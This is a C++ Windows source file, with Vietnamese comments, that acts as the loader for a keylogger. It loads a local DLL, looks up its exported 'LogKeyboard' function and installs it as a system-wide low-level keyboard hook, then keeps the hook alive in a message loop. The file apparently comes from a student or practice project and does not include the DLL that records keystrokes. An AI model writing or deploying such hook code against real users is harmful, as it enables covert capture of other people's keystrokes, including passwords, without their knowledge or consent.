#pragma warning(suppress:28251)
#include <Windows.h>
#include<string>
#include<iostream>
#include <ctime>

using namespace std;
//dinh nghia windows procedure
LRESULT CALLBACK WindowProcedure(HWND, UINT, WPARAM, LPARAM);

// khai bao bien toan cuc
char szClassName[] = "WindowsApp";
HINSTANCE hinstDLL;
HHOOK hHook = NULL;
typedef void (*LOADPROC) (HHOOK hHook);
string path = "C:\\Users\\Admin\\source\\repos\\BuildDLL\\Debug\\BuildDLL.dll";

// ham chuyen tu string to wstring
wstring s2ws(const string& s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
	wstring r(buf);
	delete[] buf;
	return r;
}

wstring temp = s2ws(path);
LPCWSTR a = temp.c_str();

HWND hwnd; //  handled cua our window
INT WINAPI  WinMain(HINSTANCE hThisInstance, HINSTANCE hPreInstance, LPSTR lpszArgument, int nFunsterStil) {

	hinstDLL = LoadLibrary(a);
	if (hinstDLL == NULL) {
		return 0;
	}
	HOOKPROC hpr = (HOOKPROC)GetProcAddress(hinstDLL, "LogKeyboard");
	if (hpr == NULL) {
		return 0;
	}
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, hpr, hinstDLL, 0);
	if (hHook == NULL) {
		return 0;
	}
	LOADPROC lpr = (LOADPROC)GetProcAddress(hinstDLL, "SetGlobalHook");
	lpr(hHook);
	
	MSG messages; // luu message cua ung dung

	// doi nhan thong diep tu hang doi ung dung
	while (GetMessage(&messages, NULL, 0, 0)) {
		TranslateMessage(&messages); 	// dich thong diep
		DispatchMessage(&messages); //Tra lai thong diep cho windowns
	}
	return messages.wParam;
}
// ham nay duoc goi boi  DispatMessage()
LRESULT CALLBACK WindowProcedure(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) {
	switch (message)
	{
	case WM_DESTROY:
		PostQuitMessage(0);
		UnhookWindowsHookEx(hHook);
		hHook = NULL;
		break;
	default:
		return DefWindowProc(hwnd, message, wParam, lParam);
		break;
	}
	return 0;
}
